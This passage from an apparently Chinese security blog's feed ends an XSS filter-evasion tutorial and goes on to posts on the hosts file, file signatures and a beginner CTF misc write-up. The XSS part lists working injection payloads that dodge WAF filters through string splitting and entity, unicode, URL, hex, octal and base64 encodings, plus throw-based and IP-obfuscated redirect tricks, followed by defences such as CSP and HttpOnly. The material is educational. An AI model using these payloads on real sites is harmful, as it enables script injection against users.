class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;a=`aler`;b=`t`;c=&apos;(`xss`);&apos;;eval(a+b+c)&quot;&gt;</span><br></pre></td></tr></table></figure><p>利用top</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](`xss`);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="其它字符混淆"><a class="markdownIt-Anchor" href="#其它字符混淆"></a> 其它字符混淆</h3><p>有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了<br>下面举几个简单的例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可利用注释、标签的优先级等</span><br><span class="line">1.&lt;&lt;script&gt;alert(&quot;xss&quot;);//&lt;&lt;/script&gt;</span><br><span class="line">2.&lt;title&gt;&lt;img src=&lt;/title&gt;&gt;&lt;img src=x onerror=&quot;alert(`xss`);&quot;&gt; //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效</span><br><span class="line">3.&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(&quot;xss&quot;);//&quot;;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure><h3 id="编码绕过"><a class="markdownIt-Anchor" href="#编码绕过"></a> 编码绕过</h3><p><code>Unicode编码绕过</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(&apos;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>url编码绕过</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&apos;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&apos;))&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p><code>Ascii码绕过</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>hex绕过</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=eval(&apos;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&apos;)&gt;</span><br></pre></td></tr></table></figure><p><code>八进制</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(&apos;\170\163\163&apos;)&gt;</span><br></pre></td></tr></table></figure><p><code>base64绕过</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&apos;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&apos;))&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="过滤双引号单引号"><a class="markdownIt-Anchor" href="#过滤双引号单引号"></a> 过滤双引号，单引号</h2><p>1.如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=alert(`xss`);&gt;</span><br></pre></td></tr></table></figure><p>2.使用编码绕过，具体看上面我列举的例子，我就不多赘述了</p><h2 id="过滤括号"><a class="markdownIt-Anchor" href="#过滤括号"></a> 过滤括号</h2><p>当括号被过滤的时候可以使用throw来绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;window.onerror=eval;throw&apos;=alert\x281\x29&apos;;&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="过滤url地址"><a class="markdownIt-Anchor" href="#过滤url地址"></a> 过滤url地址</h2><h3 id="使用url编码"><a class="markdownIt-Anchor" href="#使用url编码"></a> 使用url编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`&gt;</span><br></pre></td></tr></table></figure><h3 id="使用ip"><a class="markdownIt-Anchor" href="#使用ip"></a> 使用IP</h3><p><code>1.十进制IP</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`http://2130706433/`&gt;</span><br></pre></td></tr></table></figure><p><code>2.八进制IP</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`http://0177.0.0.01/`&gt;</span><br></pre></td></tr></table></figure><p><code>3.hex</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`http://0x7f.0x0.0x0.0x1/`&gt;</span><br></pre></td></tr></table></figure><p>4.html标签中用<code>//</code>可以代替<code>http://</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`//www.baidu.com`&gt;</span><br></pre></td></tr></table></figure><p>5.使用<code>\\</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">但是要注意在windows下\本身就有特殊用途，是一个path 的写法，所以\\在Windows下是file协议，在linux下才会是当前域的协议</span><br></pre></td></tr></table></figure><p>Windows下<br><img src="/images/94-1.gif" alt></p><p>Linux下<img src="/images/94-2.gif" alt><br>6.使用中文逗号代替英文逗号<br>如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;document.location=`http://www。baidu。com`&quot;&gt;//会自动跳转到百度</span><br></pre></td></tr></table></figure><h1 id="如何防止xss"><a class="markdownIt-Anchor" href="#如何防止xss"></a> 如何防止xss</h1><ul><li>过滤一些危险字符，以及转义<code>&amp; &lt; &gt; &quot; ' /</code>等危险字符</li><li>HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此Cookie。</li><li>设置CSP(Content Security Policy)</li><li>输入内容长度限制</li></ul><h1 id="后记"><a class="markdownIt-Anchor" href="#后记"></a> 后记</h1><p>感觉总结的不是很全面，以后会查漏补缺，如果有师傅发现错误之处，还望斧正</p><h1 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> Reference</h1><p><a href="https://html5sec.org/" target="_blank" rel="noopener">https://html5sec.org/</a><br><a href="https://blog.csdn.net/qq_29277155/article/details/51320064" target="_blank" rel="noopener">很全的xss总结</a><br><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;简述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#简述&quot;&gt;&lt;/a&gt; 简述&lt;/h1&gt;
&lt;p&gt;XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="XSS" scheme="https://muzibing.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>【转载】文件 HOSTS 的简介和修改方法</title>
    <link href="https://muzibing.github.io/2020/02/23/2020.02.23%EF%BC%8893%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/02/23/2020.02.23（93）/</id>
    <published>2020-02-22T16:00:00.000Z</published>
    <updated>2020-02-23T00:43:23.868Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一-什么是-hosts"><a class="markdownIt-Anchor" href="#一-什么是-hosts"></a> 一、什么是 hosts</h2><p>hosts —— the static table lookup for host name（主机名查询静态表）。</p><p>hosts文件是一个用于储存计算机网络中各节点信息的计算机文件。这个文件负责将主机名映射到相应的IP地址。hosts文件通常用于补充或取代网络中DNS的功能。和DNS不同的是，计算机的用户可以直接对hosts文件进行控制。</p><p>Hosts是一个没有扩展名的系统文件，其作用就是将一些常用的网址<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D/86062" target="_blank" rel="noopener">域名</a>与其对应的<a href="https://baike.baidu.com/item/IP%E5%9C%B0%E5%9D%80" target="_blank" rel="noopener">IP地址</a>建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从<a href="https://baike.baidu.com/item/Hosts%E6%96%87%E4%BB%B6" target="_blank" rel="noopener">Hosts文件</a>中寻找对应的<a href="https://baike.baidu.com/item/IP%E5%9C%B0%E5%9D%80" target="_blank" rel="noopener">IP地址</a>，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90" target="_blank" rel="noopener">域名解析</a>服务器进行IP地址的解析。</p><p>优先级 ： dns缓存 &gt; hosts &gt; dns服务</p><h2 id="二-hosts的位置"><a class="markdownIt-Anchor" href="#二-hosts的位置"></a> 二、hosts的位置</h2><p><a href="https://laod.cn/tag/hosts" target="_blank" rel="noopener">hosts</a>在各个系统中所在的文件夹：</p><ul><li>Windows 系统<a href="https://laod.cn/tag/host" target="_blank" rel="noopener">host</a>s位于 C:\Windows\System32\drivers\etc\hosts</li><li>Android（安卓）系统hosts位于 /etc/hosts</li><li>Mac（苹果电脑）系统hosts位于 /etc/hosts</li><li>iPhone（iOS）系统hosts位于 /etc/hosts</li><li>Linux系统hosts位于 /etc/hosts</li><li>绝大多数Unix系统都是在 /etc/hosts</li></ul><h2 id="三-hosts的内容"><a class="markdownIt-Anchor" href="#三-hosts的内容"></a> 三、hosts的内容</h2><p>Windows版本的hosts文件内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># Copyright (c) 1993-2009 Microsoft Corp.</span><br><span class="line"># # This is a sample HOSTS file used by Microsoft TCP/IP for Windows.</span><br><span class="line">#</span><br><span class="line"># This file contains the mappings of IP addresses to host names. Each </span><br><span class="line"># entry should be kept on an individual line. The IP address should</span><br><span class="line"># be placed in the first column followed by the corresponding host name. </span><br><span class="line"># The IP address and the host name should be separated by at least one </span><br><span class="line"># space.</span><br><span class="line"># </span><br><span class="line"># Additionally, comments (such as these) may be inserted on individual</span><br><span class="line"># lines or following the machine name denoted by a &apos;#&apos; symbol.</span><br><span class="line"># </span><br><span class="line"># For example:</span><br><span class="line">#</span><br><span class="line"># 102.54.94.97 rhino.acme.com # source server</span><br><span class="line"># 38.25.63.10 x.acme.com # x client host</span><br><span class="line"># localhost name resolution is handled within DNS itself.</span><br><span class="line"># 127.0.0.1 localhost</span><br><span class="line"># ::1 localhost</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>#后都是注释，所以清空hosts文件对系统正常运行并没有什么影响。</p><p>在一个局域网中，每台机器都有一个主机名，用于区分主机，便于相互访问。</p><p>一般/etc/hosts的内容一般有如下类似内容：</p><p>127.0.0.1  localhost.localdomain   localhost</p><p>192.168.1.100   <a href="http://linumu100.com" target="_blank" rel="noopener">linumu100.com</a>   linumu100</p><p>192.168.1.120  ftpserver   ftp120</p><p>一般情况下hosts文件的每行尾一个主机，每行由三部分组成，每个部分由空格隔开。</p><p>第一部分：网络IP地址；</p><p>第二部分：主机名或域名；</p><p>第三部分：主机名别名；</p><p>当然每行也可以是两部分，即主机IP地址和主机名。</p><p>主机名（hostname)和域名（domain)的区别：</p><p>主机名通常在局域网内使用，通过hosts文件，主机名就被解析到对应IP;</p><p>域名通常在INTERNET上使用，但如果本机不想使用internet上的域名解析，这时就可以更改hosts文件，加入自己的域名解析。</p><h2 id="四-hosts的作用"><a class="markdownIt-Anchor" href="#四-hosts的作用"></a> 四、hosts的作用</h2><p>1、加快<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90" target="_blank" rel="noopener">域名解析</a></p><p>对于要经常访问的网站，我们可以通过在Hosts中配置<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D" target="_blank" rel="noopener">域名</a>和IP的映射关系，提高域名解析速度。由于有了映射关系，当我们输入域名计算机就能很快解析出IP，而不用请求网络上的DNS服务器。</p><p>2、方便局域网用户</p><p>在很多单位的局域网中，会有服务器提供给用户使用。但由于局域网中一般很少架设DNS服务器，访问这些服务器时，要输入难记的IP地址。这对不少人来说相当麻烦。可以分别给这些服务器取个容易记住的名字，然后在Hosts中建立IP映射，这样以后访问的时候，只要输入这个服务器的名字就行了。</p><p>3、屏蔽网站（<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D%E9%87%8D%E5%AE%9A%E5%90%91" target="_blank" rel="noopener">域名重定向</a>）</p><p>有很多网站不经过用户同意就将各种各样的<a href="https://baike.baidu.com/item/%E6%8F%92%E4%BB%B6" target="_blank" rel="noopener">插件</a>安装到你的计算机中，其中有些说不定就是木马或病毒。对于这些网站我们可以利用Hosts把该网站的<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D" target="_blank" rel="noopener">域名</a>映射到错误的IP或本地计算机的IP，这样就不用访问了。</p><p>4、顺利连接系统</p><p>对于Lotus的服务器和一些<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%8D%E5%8A%A1%E5%99%A8" target="_blank" rel="noopener">数据库服务器</a>，在访问时如果直接输入IP地址那是不能访问的，只能输入服务器名才能访问。那么我们配置好Hosts文件，这样输入服务器名就能顺利连接了。</p><p>5.虚拟域名</p><p>很多时候，网站建设者需要把”软环境“搭建好，再进行上传调试。但类似于邮件服务，则需要使用域名来辅助调试，这时就可以将本地 IP 地址与一个”虚拟域名“做地址指向，就可以达到要求的效果，且无需花费。如：</p><ul><li>127.0.0.1 网站域名</li><li>之后在浏览器地址栏中输入对应的网站域名即可。</li></ul><h2 id="五-如何修改hosts"><a class="markdownIt-Anchor" href="#五-如何修改hosts"></a> 五、如何修改hosts</h2><h3 id="1-屏蔽网站域名重定向"><a class="markdownIt-Anchor" href="#1-屏蔽网站域名重定向"></a> 1、屏蔽网站（域名重定向）</h3><p>在WINDOWS系统中，约定 127.0.0.1 为本地计算机的IP地址, 0.0.0.0是错误的IP地址。</p><p>如果，我们在hosts中，写入以下内容：</p><p>127.0.0.1 要屏蔽的网站A的域名</p><p>0.0.0.0 要屏蔽的网站B的域名</p><p>这样，计算机<a href="https://baike.baidu.com/item/%E8%A7%A3%E6%9E%90%E5%9F%9F%E5%90%8D" target="_blank" rel="noopener">解析域名</a>A和 B时，就解析到本机IP或错误的IP，达到了屏蔽网站A 和B的目的。</p><p>在修改hosts文件时候，还常常遇到修改保存后无效的情况，这里要提醒大家注意的一点：很多人是写在最后行，写完最后一行后在没有回车的情况下，这一行是不生效的。一定要记得回车。建议大家遵循这样的习惯：“ip地址+Tab+<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D" target="_blank" rel="noopener">域名</a>+换行” 添加记录。</p><h3 id="2-局域网用户访问"><a class="markdownIt-Anchor" href="#2-局域网用户访问"></a> 2、局域网用户访问</h3><p>如果，我们在A主机的hosts中，写入以下内容：</p><p>B主机的ip B主机名</p><p>这样我们就可以通过B主机名找到B主机及其服务。</p><h3 id="3-android系统的hosts修改"><a class="markdownIt-Anchor" href="#3-android系统的hosts修改"></a> 3、android系统的hosts修改</h3><p>在 Android 下，/etc 是 link 到 /system/etc 的，我们需要修改 /system/etc/hosts 来实现。但是这个文件是只读，不能通过 shell 直接修改。可以通过连接到 PC 上使用 adb 来修改。步骤如下：</p><p>（1）获得<a href="https://baike.baidu.com/item/root%E6%9D%83%E9%99%90" target="_blank" rel="noopener">root权限</a>：adb root</p><p>（2）设置/system为可读写：adb remount</p><p>（3）将<a href="https://baike.baidu.com/item/hosts%E6%96%87%E4%BB%B6" target="_blank" rel="noopener">hosts文件</a>复制到PC：adb pull /system/etc/hosts</p><p>（4）修改PC机上文件</p><p>（5）将PC机上文件复制到手机：adb push /system/etc/hosts</p><p>如果要查看是否修改成功，可以在PC上执行adb shell，运行cat /system/etc/hosts;或者在手机上运行cat /system/etc/hosts。</p><p>在Android系统中，hosts文件格式有一点与PC机Linux不同：不能在一行中一个IP对应多个<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D" target="_blank" rel="noopener">域名</a>，比如：</p><p>127.0.0.1 <a href="http://host1.example.com" target="_blank" rel="noopener">host1.example.com</a> <a href="http://host2.example.com" target="_blank" rel="noopener">host2.example.com</a> <a href="http://host3.example.com" target="_blank" rel="noopener">host3.example.com</a></p><p>在大多PC机Linux系统是合法的，但不能在Android上起作用，需要拆成每个域名一行才能使用：</p><p>x.x.x.x <a href="http://host1.example.com" target="_blank" rel="noopener">host1.example.com</a></p><p>x.x.x.x <a href="http://host2.example.com" target="_blank" rel="noopener">host2.example.com</a></p><p>x.x.x.x <a href="http://host3.example.com" target="_blank" rel="noopener">host3.example.com</a></p><h3 id="4-通过修改hosts上google"><a class="markdownIt-Anchor" href="#4-通过修改hosts上google"></a> 4、通过修改hosts上google</h3><p>第一步：下载可以正常使用的hosts文件</p><p>可以在百度搜索类似“Google hosts”等相关关键词或者老D，找到最新可用的host文件。</p><p>第二步：修改本地hosts文件</p><p>在电脑系统中找到hosts，路径基本上是C:\Windows\System32\drivers\etc，然后将下载的hosts文件将本地hosts文件替换，或者在本地hosts文件中直接在地址栏修改即可！</p><p>第三步：刷新本地dns</p><p>第二步完成本地hosts文件的修改之后，可以使用dos命令完成最后的操作。</p><p>（1）使用WIN+R键，启动运行，键入cmd</p><p>（2）在dos界面输入“ipcong /flushdns”</p><p>（3）dos命令窗提示“已成功刷新DNS解析缓存”，就完成了。</p><h2 id="六-其他"><a class="markdownIt-Anchor" href="#六-其他"></a> 六、其他</h2><h3 id="1-怎么获取域名所对应的ip地址"><a class="markdownIt-Anchor" href="#1-怎么获取域名所对应的ip地址"></a> 1、怎么获取域名所对应的IP地址</h3><p>打开“开始――运行”，输入“cmd”，在命令行界面输入“ping <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>”，回车。</p><p>显示结果类似：Reply from 220.181.6.18:bytes=32 time=24msTTL=55。</p><p>其中的220.181.6.18就是域名所对应IP地址（百度的）。呵呵！</p><h3 id="2-修改hosts后生效方法"><a class="markdownIt-Anchor" href="#2-修改hosts后生效方法"></a> 2、修改hosts后生效方法</h3><p>（1）Windows</p><p>开始 -&gt; 运行 -&gt; 输入cmd -&gt; 在CMD窗口输入</p><p>ipconfig /flushdns</p><p>（2）Linux</p><p>打开终端</p><p>重启网络：</p><p>sudo /etc/init.d/networking restart</p><p>desktop版可以这样重启：</p><p>sudo service network-manager restart</p><p>如果只是修改了某个网卡(例如eth0)的信息，也可以通过重启网卡的方式使其修改生效。</p><p>sudo ifdown eth0 sudo ifup eth0</p><p>如果不懂请都尝试下</p><p>（3）Mac OS X终端输入</p><p>sudo killall -HUP mDNSResponder</p><p>（4）Android</p><p>开启飞行模式 -&gt; 关闭飞行模式</p><p>（5）通用方法</p><p>拔网线(断网) -&gt; 插网线(重新连接网络)</p><p>如不行请清空浏览器缓存（建议不要使用国产浏览器，请使用谷歌Chrome浏览器）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一-什么是-hosts&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#一-什么是-hosts&quot;&gt;&lt;/a&gt; 一、什么是 hosts&lt;/h2&gt;
&lt;p&gt;hosts —— the static table lookup for host nam
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>各种文件的文件头和文件尾总结</title>
    <link href="https://muzibing.github.io/2020/02/09/2020.02.09%EF%BC%8892%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/02/09/2020.02.09（92）/</id>
    <published>2020-02-08T16:00:00.000Z</published>
    <updated>2020-02-09T08:51:27.251Z</updated>
    
    <content type="html"><![CDATA[<table><thead><tr><th style="text-align:center">文件类型</th><th style="text-align:center">文件头</th><th style="text-align:center">文件尾</th></tr></thead><tbody><tr><td style="text-align:center"><strong><font color="brown">JPEG</font></strong></td><td style="text-align:center">FFD8FF</td><td style="text-align:center">FF D9</td></tr><tr><td style="text-align:center"><strong><font color="brown">PNG (png)</font></strong></td><td style="text-align:center">89504E47</td><td style="text-align:center">AE 42 60 82</td></tr><tr><td style="text-align:center"><strong><font color="brown">GIF (gif)</font></strong></td><td style="text-align:center">47494638</td><td style="text-align:center">00 3B</td></tr><tr><td style="text-align:center"><strong><font color="brown">ZIP Archive (zip)</font></strong></td><td style="text-align:center">504B0304</td><td style="text-align:center">50 4B</td></tr><tr><td style="text-align:center"><strong><font color="brown">TIFF (tif)</font></strong></td><td style="text-align:center">49492A00</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Windows Bitmap (bmp)</td><td style="text-align:center">424D</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">CAD (dwg)</td><td style="text-align:center">41433130</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Adobe Photoshop (psd)</td><td style="text-align:center">38425053</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Rich Text Format (rtf)</td><td style="text-align:center">7B5C727466</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center"><strong><font color="navy">XML (xml)</font></strong></td><td style="text-align:center">3C3F786D6C</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center"><strong><font color="navy">HTML (html)</font></strong></td><td style="text-align:center">68746D6C3E</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">Winhex：3C 21 44 4F 43 54 59 50 45 20 68 74 6D 6C 3E</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">Email [thorough only] (eml)</td><td style="text-align:center">44656C69766572792D646174653A</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Outlook Express (dbx)</td><td style="text-align:center">CFAD12FEC5FD746F</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Outlook (pst)</td><td style="text-align:center">2142444E</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center"><strong><font color="navy">MS Word/Excel (xls.or.doc)</font></strong></td><td style="text-align:center">D0CF11E0</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">MS Access (mdb)</td><td style="text-align:center">5374616E64617264204A</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">WordPerfect (wpd)</td><td style="text-align:center">FF575043</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center"><strong><font color="navy">Adobe Acrobat (pdf)</font></strong></td><td style="text-align:center">255044462D312E</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Quicken (qdf)</td><td style="text-align:center">AC9EBD8F</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Windows Password (pwl)</td><td style="text-align:center">E3828596</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">RAR Archive (rar)</td><td style="text-align:center">52617221</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center"><strong><font color="brown">Wave (wav)</font></strong></td><td style="text-align:center">57415645</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center"><strong><font color="brown">AVI (avi)</font></strong></td><td style="text-align:center">41564920</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Real Audio (ram)</td><td style="text-align:center">2E7261FD</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Real Media (rm)</td><td style="text-align:center">2E524D46</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center"><strong><font color="brown">Quicktime (mov)</font></strong></td><td style="text-align:center">6D6F6F76</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">Windows Media (asf)</td><td style="text-align:center">3026B2758E66CF11</td><td style="text-align:center">——</td></tr><tr><td style="text-align:center">MIDI (mid)</td><td style="text-align:center">4D546864</td><td style="text-align:center">——</td></tr></tbody></table><p>附件：<a href="http://pan.baidu.com/s/1c3raQM" target="_blank" rel="noopener">文件格式分析器</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&quot;text-align:center&quot;&gt;文件类型&lt;/th&gt;
&lt;th style=&quot;text-align:center&quot;&gt;文件头&lt;/th&gt;
&lt;th style=&quot;text-align:center&quot;&gt;文件尾&lt;/th&gt;
&lt;
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>【WP】XCFT misc新手阶段</title>
    <link href="https://muzibing.github.io/2020/01/30/2020.01.30%EF%BC%8891%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/01/30/2020.01.30（91）/</id>
    <published>2020-01-29T16:00:00.000Z</published>
    <updated>2020-02-09T08:10:32.893Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown一-pdffont"><a class="markdownIt-Anchor" href="#font-color-brown一-pdffont"></a> <font color="brown">一、PDF</font></h3><h4 id="font-color-navy1基础知识font"><a class="markdownIt-Anchor" href="#font-color-navy1基础知识font"></a> <font color="navy">1.基础知识</font></h4><blockquote><p>无</p></blockquote><h4 id="font-color-navy2题目要求font"><a class="markdownIt-Anchor" href="#font-color-navy2题目要求font"></a> <font color="navy">2.题目要求</font></h4><p><img src="/images/91-1.jpg" alt></p><h4 id="font-color-navy3做题步骤font"><a class="markdownIt-Anchor" href="#font-color-navy3做题步骤font"></a> <font color="navy">3.做题步骤</font></h4><blockquote><p>直接 pdf 转换为 word （<a href="https://lightpdf.com/pdf-to-word" target="_blank" rel="noopener">转换工具点击这里</a>），然后将 word 中的图片进行移动，会发现图片下的 flag。</p></blockquote><h3 id="font-color-brown二-如来十三掌font"><a class="markdownIt-Anchor" href="#font-color-brown二-如来十三掌font"></a> <font color="brown">二、如来十三掌</font></h3><h4 id="font-color-navy1基础知识font-2"><a class="markdownIt-Anchor" href="#font-color-navy1基础知识font-2"></a> <font color="navy">1.基础知识</font></h4><blockquote><ol><li><strong>与佛论禅</strong>算法的原理和本质</li><li>ROT-13 加密解密：其本质就是凯撒密码的密钥为 13 （平移13个字符）</li></ol></blockquote><h4 id="font-color-navy2题目要求font-2"><a class="markdownIt-Anchor" href="#font-color-navy2题目要求font-2"></a> <font color="navy">2.题目要求</font></h4><p><img src="/images/91-2.png" alt></p><h4 id="font-color-navy3做题步骤font-2"><a class="markdownIt-Anchor" href="#font-color-navy3做题步骤font-2"></a> <font color="navy">3.做题步骤</font></h4><blockquote><ol><li><p>下载附件，得到一个 word 文件，打开该文档，发现里面的内容如下：</p><p><img src="/images/91-3.jpg" alt></p></li><li><p>将文字放到“与佛论禅”破解网站里面进行翻译，如下图：</p><p><img src="/images/91-4.jpg" alt></p></li><li><p>根据题目“如来十三掌”的题目提示，我们用 rot-13 进行解密，脚本代码如下：</p><p><img src="/images/91-5.jpg" alt></p></li><li><p>运行脚本，得到对应的密文：</p><p><img src="/images/91-6.jpg" alt></p></li><li><p>但是我们从得到的结果中不能得到什么结果，查了查，发现还要经过 base64 